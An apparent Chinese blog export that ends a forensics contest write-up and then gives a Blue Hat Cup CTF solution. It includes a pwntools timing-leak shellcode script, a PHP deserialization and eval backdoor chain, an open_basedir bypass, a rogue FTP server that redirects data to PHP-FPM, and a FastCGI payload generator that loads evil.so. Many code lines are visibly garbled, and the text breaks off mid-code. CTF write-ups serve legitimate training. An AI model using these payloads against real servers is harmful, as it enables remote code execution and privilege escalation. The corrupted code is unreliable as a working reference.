<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0og0Aenib0IcWYM6ngQN21udgvwcx9a8pPcFGgw6Q2Av139dK2OS5YGA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201130212638074</p>
<h3 id="第43到51题"><a href="#第43到51题" class="headerlink" title="第43到51题"></a>第43到51题</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0x8EnbXvhW9KF1guS7ozeW9QeIqrgMiczqNwox3m14QaBIcmGNYkQ5yg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201145328013</p>
<p>第43、44</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0qjg9CGrwaqq6e031nqIUZA0UuIp2PUYC9RF31nXIWv5PMNBkaicMvvw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201145453592</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0OZfuT7clZNclTib0D8xzNsA2L4mktVuQ6XTwk9JEn6wSgazjAR73ia5Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201145659776</p>
<p>第45题是推断题</p>
<p>从整体的聊天记录可以看出，cole是提出意见，推动实施的人，bob我倒是没看出来，但是因为只有b选项有cole，所以当时选了b</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0rwLnVzsED7aibQk1hcyCESTexNhO5h0QEg8iaEXhA3QAYTSFhOyXOAGA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201145753152</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp03ib19PxmRjgBCWJ6vRDWcxHaiczA3icC0U1GlFszMH6dRibfIlyo6mfRoQ/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p>第46题</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0LpqBuB5Qlqk8UaLoCkwrwpu414cWkXFgRfpqd1p8QLC4Xby0EHVsibA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201150229857</p>
<h4 id="第47、48题"><a href="#第47、48题" class="headerlink" title="第47、48题*"></a>第47、48题*</h4><p>搜索可得</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0F2Q2q7g85tgwgn4iczpOt5zicQ7Y2icqcPRlsxTTiaPcYmvwvSYgYz2iaMA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040278.png" alt="image-20211019095404277"></p>
<p>msgstore.db存储了聊天记录，发现creation，选择Unix时间戳转换可得时间</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040280.png" alt="image-20211019095739267"></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040281.png" alt="image-20211019100006911"></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0EReoIvOfias67XbyTsPP9v1icVENQG0MU6iafZ3Um254E2pRquIIDiaQ1g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201151053089</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0KnHYTcI82fwSWBD61xL0ueG00dbzOrnNLkTAtyeItTdnibAOomA0TJg/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201151118344</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0psU4zzO4RpmJx0jYicJyAIYWuMLN5qmNKDJsC6tYwmEiblUjic3fDZK2Q/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201150756840</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0BztzuSF1qFvWibg1XLw6ico6g1rIlO3yFGMDCZgYIvCh5OUGYww9uWOA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201145344034</p>
<p>第50题</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp03dHOyvyPa4omoCUphS7JdO9tdcMt3ElvriaDnn9f9KxN5PPbgz6W1Rw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201150826508</p>
<p>第51题</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0rjJ8KbibQow7Ciadg68NKuMev3ibicxVx7rhxC4H5XslgOfZEWIdDkXHlA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201151604727</p>
<p>转时间戳</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0MKJTfuPPQCqkWYZpaP0WqFgQ73fn3NEFxNaUFRhoAyaBgS4d1Kcf6w/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201151745288</p>
<p>查数据库</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0zW23oSevJicYVasmUWEX6ISze1snxNgpjnKy1dABcbwDcxQaPyHee6A/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201151841496</p>
<h3 id="第52题"><a href="#第52题" class="headerlink" title="第52题"></a>第52题</h3><p>找到系统分区，从/etc/wifi/WCNSS配置文件可以找到</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040282.png" alt="image-20211019140202055"></p>
<p>或</p>
<p><a href="https://img2020.cnblogs.com/blog/2217734/202011/2217734-20201120162542763-2096320726.png"><img src="https://img2020.cnblogs.com/blog/2217734/202011/2217734-20201120162542763-2096320726.png" alt="img"></a><br>可以把这个镜像拖到winhex里面搜一遍</p>
<h3 id="第53题"><a href="#第53题" class="headerlink" title="第53题"></a>第53题</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">)<img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0ib9vVy7dIWKcicqHMBBXibOSXRCXTqDTDN0RWWxicKNcVYE3N8M1TqGt1g/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201153255949</p>
<p>给的电脑照片上贴了俩纸条，挨个试一试就好了，那个QPzm的是对的</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0M70rpyhJWD0Zxg0rCNJXsiaZus5MaH4zYCbh3j9HwRIgicsRjria1CJsA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201152253053</p>
<h3 id="第54到57题"><a href="#第54到57题" class="headerlink" title="第54到57题"></a>第54到57题</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">)<img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0BfHECtqyZn8xwiaicyQ4xUX91eWm2h25LE5f7TUAklGjUypH7uQlZSxA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201153242021</p>
<p>挨个apk装一遍即可</p>
<p>那俩纸条的另一个就是这个秘密讯息解密的密码</p>
<p>这个apk是解密图片用的，U盘里正好有一个bob photo</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0kWdUNeyYsNgFoOmM1gJ2DfC5lwyDqhOCacOoudqe3CzHIiaibbYyJ9CA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片"></p>
<p>image-20201201153559284</p>
<h3 id="第58到61题"><a href="#第58到61题" class="headerlink" title="第58到61题"></a>第58到61题</h3><p><img src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="图片">)<img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp07HvwoAnJMXAXVUqzKB1xHfHwGe9IWyyykzwSpxicKu1QZovvZJZO1Dw/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">image-20201201153953389</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/1kzx23sqO1kH0tUcGjylSNvFNAyMECp0H3uBHgETUsQnEA58Q3ib8R5QNVur8xRyRsuiaFIvzYGoyMt7EHaLnSQA/640?wx_fmt=png&amp;tp=webp&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="图片">img</p>
<p>简单题</p>
<p>59</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040283.png" alt="image-20211019094523998"></p>
<p>取证大师算一下</p>
<p>60</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040284.png" alt="image-20211019094255981"></p>
<p>61</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/202111032040285.png" alt="image-20211019094035199"></p>
]]></content>
      <categories>
        <category>取证</category>
      </categories>
      <tags>
        <tag>美亚杯</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届“蓝帽杯” 初赛WriteUp</title>
    <url>/bluehat2021chusai.html</url>
    <content><![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>存在shellcode执行</p>
<p>去年蓝帽决赛原题：附带解题链接</p>
<p><a href="https://www.cnblogs.com/p201821440039/p/14219506.html">https://www.cnblogs.com/p201821440039/p/14219506.html</a></p>
<p>脚本如下：</p>
<pre><code>from pwn import *
elf=ELF('./chall')
EXCV = context.binary = './chal'
libc=('')
#context.log_level = 'debug'

def pwn, idx, c):
      # open
    shellcode = "push 0x10032aaa; pop rdrdi; shr edi, 12; xor esi, esi; push 2; pop rax; syscall;"

    # re open, rax =&gt; 4
    shellcode += "push 2; pop rax; syscall;"

    # read(rax, 0x10040, 0x50)
    shellcode += "mov rdi, rax; xor eax, eax; push 0x50; pop rdx; push 0x10040aaa; pop rsi; shr esi, 12; syscall;"

    # cmp and jz
    if idx == 0:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-3; ret".format(idx, c)
    else:
        shellcode += "cmp byte ptr[rsi+{0}], {1}; jz $-4; ret".format(idx, c)

    shellcode = asm(shellcode)

    p.sendafter("xecution-box.\n", shellcode.ljust(0x40-14, b'a') + b'/home/pwn/flag')

idx = 0
var_list = []
while(1):
    for c in range(32, 127):
        p = remote("8.140.177.7",40334)#nc 8.131.246.36 40334    
        pwn(p, idx, c)
        start = time.time()
        try:
            p.recv(timeout=2)
        excep:
            pass
        end = time.time()
        p.close()
         if end-start &gt; 1.5:
            var_list.append(c)
            print("".join([chr(i) for i in var_list]))
            break
    else:
        print("".join([chr(i) for i in var_list]))
        break
    idx = idx + 1

print("".join([chr(i) for i in var_list]))</code></pre><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Ball-sigin"><a href="#Ball-sigin" class="headerlink" title="Ball_sigin"></a>Ball_sigin</h2><p>玩出来的</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514093434.jpg" alt="web1"></p>
<h2 id="one-Pointer-php"><a href="#one-Pointer-php" class="headerlink" title="one_Pointer_php"></a>one_Pointer_php</h2><p>感谢buuctf，蓝帽复现环境提供的太及时了，太强了</p>
<p>参考链接：</p>
<p><a href="https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6">https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/#i-6</a></p>
<p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/343918026">https://zhuanlan.zhihu.com/p/343918026</a></p>
<p>源码就俩文件：</p>
<pre><code>add_api.php
&lt;?php
include "user.php";
if($user=unserialize($_COOKIE["data"])){
    $count[++$user-&gt;count]=1;
    if($count[]=1){
        $user-&gt;count+=1;
        setcookie("data",seialize($user));
    }else{
        eval($_GET["backdoor"]);
    }
}else{
    $uuser=new User;
    $user-&gt;count=1;
    setcookie("data",serialize($user));
}
?&gt;
user.php
&lt;?php
class User{
    public $count;
}
?&gt;</code></pre><p>第一部分整型溢出略过</p>
<pre><code>&lt;?php
class User{
    public $count=9223372036854775806;
}
$a = new User;

echo urlencode(serialize($a));
//O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A9223372036854775806%3B%7D
?&gt;</code></pre><p>第二部分可以通过eval执行代码，发现禁用了好多函数和类，而且做了open_basedir</p>
<pre><code>disable_functions = stream_socket_client,fsockopen,putenv,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,iconv,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail,error_log,debug_backtrace,debug_print_backtrace,gc_collect_cycles,array_merge_recursive

; This directive allows you to disable certain classes.
; http://php.net/disable-classes

disable_classes = Exception,SplDoublyLinkedList,Error,ErrorException,ArgumentCountError,ArithmeticError,AssertionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException   Exception,SplDoublyLinkedLit,Error,ErrorException,ArgumentCountError,ArithmeticError,AsserttionError,DivisionByZeroError,CompileError,ParseError,TypeError,ValueError,UnhandledMatchError,ClosedGeneratorException,LogicException,BadFunctionCallException,BadMethodCallException,DomainException,InvalidArgumentException,LengthException,OutOfRangeException,PharException,ReflectionException,RuntimeException,OutOfBoundsException,OverflowException,PDOException,RangeException,UnderflowException,UnexpectedValueException,JsonException,SodiumException</code></pre><p>绕过open_basedir:</p>
<pre><code>mkdir('img');chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));</code></pre><p>可以读取到php.ini啥的，但是flag读取不了，查看权限显示为<code>0400</code>，绝对是要getshell后提权</p>
<p>phpinfo处显示有一个easy_bypass，这个应该是预期解，web pwn</p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094637.png" alt="image-20210502153907457"></p>
<p>通过phpinfo还可以发现环境是<code>FPM/FastCGI</code>，绕过open_basedir读php.ini可以看到端口为<code>9001</code></p>
<p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210514094639.png" alt="image-20210502154013951"></p>
<p>考虑到可以通过攻击<code>FPM</code>来bypass</p>
<p>因为禁用了许多函数和类，普通的ssrf无法使用，但是ftp协议未被禁用</p>
<p>这篇文章讲的挺清楚：</p>
<p><a href="https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/">https://rmb122.com/2020/12/30/hxp-CTF-resonator-Writeup-SSRF-via-file-put-contents/</a></p>
<p>ftp 协议相对比较复杂, 其中存在一个特性, 相信大家都听说过, 就是 ftp 的数据端口和指令端口是分开的, 我们平时所说的 21 号端口其实是 ftp 的指令端口, 用于发送指令, 比如认证用户和指定读取的文件. 但是如果是传输文件的内容, ftp 实际上会重新打开一个链接, 同时还分为两种模式, 被动模式和主动模式.</p>
<p>这里 wikipedia 讲的比较清楚, 我直接复制一段过来</p>
<pre><code>FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。</code></pre><p>注意 <code>被动模式只要求服务器端产生一个监听相应端口的进程</code>, 这里有非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. 由于 ftp 和 http 类似, 协议内容全是纯文本, 我们可以很清晰的看到它是如何指定地址和端口的</p>
<pre><code>227 Entering Passive Mode(192,168,9,2,4,8)</code></pre><p>227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语, 而 (192,168,9,2,4,8) 代表让客户端连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口.<br>这样这个如何利用就很明显了, file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.</p>
<h3 id="伪造FTP服务器"><a href="#伪造FTP服务器" class="headerlink" title="伪造FTP服务器"></a>伪造FTP服务器</h3><pre><code>import socket

host = '0.0.0.0'
port = 2334
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

conn, address = sk.accept()
conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)

conn.send("300 \n")
print '300'
print conn.recv(20)

conn.send("200 \n")
print '200'
print conn.recv(20)
print "ck"
nn.send("22 127,0,0,1,0,9001\n")
print '200'
print conn.recv(20)0)

conn.sendd("150 \n")
print '150'
print conn.recv(20)
conn.close()
exit()</code></pre><h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><pre><code>&lt;?php
&lt;?php
/**
 * Note : Code is released under the GNU LGPL
 *
 * Please do not change the header of this file
 *
 * This library is free software; you can redistribute it and/or modify it under the terms of the GNU
 * Lesser General Public License as published by the Free Software Foundation; either version 2 of
 * the License, or (at your option) any later version.
 *
 * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
 * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 * See the GNU Lesser General Public License for more details.
 */
/**
 * Handles communication with a FastCGI application
 *
 * @author      Pierrick Charron &lt;pierrick@webstart.fr&gt;
 * @version     1.0
 */
class FCGIClient
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const MAXTYPE              = self::UNKNOWN_TYPE;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const MAX_CONNS            = 'MAX_CONNS';
    const MAX_REQS             = 'MAX_REQS';
    const MPXS_CONNS           = 'MPXS_CONNS';
    const HEADER_LEN           = 8;
    /**
     * Socket
     * @var Resource
     */
    private $_sock = null;
    /**
     * Host
     * @var String
     */
    private $_host = null;
    /**
     * Port
     * @var Integer
     */
    private $_port = null;
    /**
     * Keep Alive
     * @var Boolean
     */
    private $_keepAlive = false;
    /**
     * Constructor
     *
     * @param String $host Host of the FastCGI application
     * @param Integer $port Port of the FastCGI application
     */
    public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
    {
        $this-&gt;_host = $host;
        $this-&gt;_port = $port;
    }
    /**
     * Define whether or not the FastCGI application should keep the connection
     * alive at the end of a request
     *
     * @param Boolean $b true if the connection should stay alive, false otherwise
     */
    public function setKeepAlive($b)
    {
        $this-&gt;_keepAlive = (boolean)$b;
        if (!$this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock) {
            fclose($this-&gt;_sock);
        }
    }
    /**
     * Get the keep alive status
     *
     * @return Boolean true if the connection should stay alive, false otherwise
     */
    public function getKeepAlive()
    {
        return $this-&gt;_keepAlive;
    }
    /**
     * Create a connection to the FastCGI application
     */
    private function connect()
    {
        if (!$this-&gt;_sock) {
            //$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
            $this-&gt;_sock = stream_socket_client($this-&gt;_host, $errno, $errstr, 5);
            if (!$this-&gt;_sock) {
                throw new Exception('Unable to connect to FastCGI application');
            }
        }
    }
    /**
     * Build a FastCGI packet
     *
     * @param Integer $type Type of the packet
     * @param String $content Content of the packet
     * @param Integer $requestId RequestId
     */
    private function buildPacket($type, $content, $requestId = 1)
    {
        $clen = strlen($content);
        rturn chr(self::VERSION_1)         /* version */
            . chhr($type)                    /* type */
            . chr(($requestId &gt;&gt; 8) &amp; 0xFF) /* requestIdB1 */
            . chr$requestId &amp; 0xFF)        /* requestIdB0 */
            . chr(($$clen &gt;&gt; 8 ) &amp; 0xFF)     /* contentLengthB1 */
            . chr($clen &amp; 0xFF)             /* contentLengthB0 */
            . chr(0)                        /* paddingLength */
            . chr(0)                        /* reserved */
            . $content;                     /* content */
    }
    /**
     * Build an FastCGI Name value pair
     *
     * @param String $name Name
     * @param String $value Value
     * @return String FastCGI Name value pair
     */
    private function buildNvpair($name, $value)
    {
        $nlen = strlen($name);
        $vlen = strlen($value);
        if ($nlen &lt; 128) {
            /* nameLengthB0 */
            $nvpair = chr($nlen);
        } else {
            /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
            $nvpair = chr(($nlen &gt;&gt; 24) | 0x80) . chr(($nlen &gt;&gt; 16) &amp; 0xFF) . chr(($nlen &gt;&gt; 8) &amp; 0xFF) . chr($nlen &amp; 0xFF);
        }
        if ($vlen &lt; 128) {
            /* valueLengthB0 */
            $nvpair .= chr($vlen);
        } else {
            /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
            $nvpair .= chr(($vlen &gt;&gt; 24) | 0x80) . chr(($vlen &gt;&gt; 16) &amp; 0xFF) . chr(($vlen &gt;&gt; 8) &amp; 0xFF) . chr($vlen &amp; 0xFF);
        }
        /* nameData &amp; valueData */
        return $nvpair . $name . $value;
    }
    /**
     * Read a set of FastCGI Name value pairs
     *
     * @param String $data Data containing the set of FastCGI NVPair
     * @return array of NVPair
     */
    private function readNvpair($data, $length = null)
    {
        $array = array();
        if ($length === null) {
            $length = strlen($data);
        }
        $p = 0;
        while ($p != $length) {
            $nlen = ord($data{$p++});
            if ($nlen &gt;= 128) {
                $nlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $nlen |= (ord($data{$p++}) &lt;&lt; 16);
                $nlen |= (ord($data{$p++}) &lt;&lt; 8);
                $nlen |= (ord($data{$p++}));
            }
            $vlen = ord($data{$p++});
            if ($vlen &gt;= 128) {
                $vlen = ($nlen &amp; 0x7F &lt;&lt; 24);
                $vlen |= (ord($data{$p++}) &lt;&lt; 16);
                $vlen |= (ord($data{$p++}) &lt;&lt; 8);
                $vlen |= (ord($data{$p++}));
            }
            $array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
            $p += ($nlen + $vlen);
        }
        return $array;
    }
    /**
     * Decode a FastCGI Packet
     *
     * @param String $data String containing all the packet
     * @return array
     */
    private function decodePacketHeader($data)
    {
        $ret = array();
        $ret['version']       = ord($data{0});
        $ret['type']          = ord($data{1});
        $ret['requestId']     = (ord($data{2}) &lt;&lt; 8) + ord($data{3});
        $ret['contentLength'] = (ord($data{4}) &lt;&lt; 8) + ord($data{5});
        $ret['paddingLength'] = ord($data{6});
        $ret['reserved']      = ord($data{7});
        return $ret;
    }
    /**
     * Read a FastCGI Packet
     *
     * @return array
     */
    private function readPacket()
    {
        if ($packet = fread($this-&gt;_sock, self::HEADER_LEN)) {
            $resp = $this-&gt;decodePacketHeader($packet);
            $resp['content'] = '';
            if ($resp['contentLength']) {
                $len  = $resp['contentLength'];
                while ($len &amp;&amp; $buf=fread($thresp['contentLength']) {
                $len  = $resp['contentL                  $resp['content'] .= $buf;
                }
            }
            if ($resp['paddingLength']) {
                $buf=fread($this-&gt;_sock, $resp['paddingLength']);
            }
            return $resp;
        } else {
            return false;
        }
    }
    /**
     * Get Informations on the FastCGI application
     *
     * @param array $requestedInfo information to retrieve
     * @return array
     */
    public function getValues(array $requestedInfo)
    {
        $this-&gt;connect();
        $request = '';
        foreach ($requestedInfo as $info) {
            $request .= $this-&gt;buildNvpair($info, '');
        }
        fwrite($this-&gt;_sock, $this-&gt;buildPacket(self::GET_VALUES, $request, 0));
        $resp = $this-&gt;readPacket();
        if ($resp['type'] == self::GET_VALUES_RESULT) {
            return $this-&gt;readNvpair($resp['content'], $resp['length']);
        } else {
            throw new Exception('Unexpected response typ, expecting GET_VALUES_RESULT');
        }
    }
    /**
     *  Execute a request to the FastCGI application
     *
     * @param array $params Array of parameters
     * @param String $stdin Content
     * @return String
     */
    public function request(array $params, $stdin)
    {
        $response = '';
//        $this-&gt;connect();
        $request = $this-&gt;buildPacket(self::BEGIN_REQUEST, chr(0 . chr(self::RESPONDER) . chr((int) $this-&gt;_keepAlive) . str_reppeat(chr(0), 5));
        $paramsRequest = '';
        foreach ($params as $key =&gt; $value) {
            $paramsRequest .= $this-&gt;buildNvpair($key, $value);
        }
        if ($paramsRequest) {
            $request .= $this-&gt;buildPacket(self::PARAMS, $paramsRequest);
        }
        $request .= $this-&gt;buildPacket(self::PARAMS, '');
        if ($stdin) {
            $request .= $this-&gt;buildPacket(self::STDIN, $stdin);
        }
        $request .= $this-&gt;buildPacket(self::STDIN, '');
        // 输出构造好的请求
        return (urlencode($request));
//        fwrite($this-&gt;_sock, $request);
//        do {
//            $resp = $this-&gt;readPacket();
//            if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
//                $response .= $resp['content'];
//            }
//        } while ($resp &amp;&amp; $resp['type'] != self::END_REQUEST);
//        var_dump($resp);
//        if (!is_array($resp)) {
//            throw new Exception('Bad request');
//        }
//        switch (ord($resp['content']{4})) {
//            case self::CANT_MPX_CONN:
//                throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
//                break;
//            case self::OVERLOADED:
//                throw new Exception('New request rejected; too busy [OVERLOADED]');
//                break;
//            case self::UNKNOWN_ROLE:
//                throw new Exception('Role value not known [UNKNOWN_ROLE]');
//                break;
//            case self::REQUEST_COMPLETE::/                return $response;
//        }
    }
}
// php5

// ssrf生成payload的话，这里不用管
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$SCRIPT_FILENAME = '/var/www/html/user.php';
$SCRIPT_NAME = '/'.basename($SCRIPT_FILENAME);
// GET参数
$REQUEST_URI = $SCRIPT_NAME;
// POST参数
$content = '';
// 设置php_value利用php://input执行代码
// $PHP_ADMIN_VALUE = "allow_url_include=On\nopen_basedir=/\nauto_prepend_file=php://input";
// 设置php_value加载恶意so文件，把so文件上传到/var/www/html中或其他目录
$PHP_ADMIN_VALUE = "extension_dir = /var/www/html\nextension = evil.so\n";
$res = $client-&gt;request(
                      array(
                            'GATEWAY_INTERFACE' =&gt; 'FastCGI/1.0',
                            'REQUEST_METHOD' =&gt; 'POST',
                            'SCRIPT_FILENAME' =&gt; $SCRIPT_FILENAME,
                            'SCRIPT_NAME' =&gt; $SCRIPT_NAME,
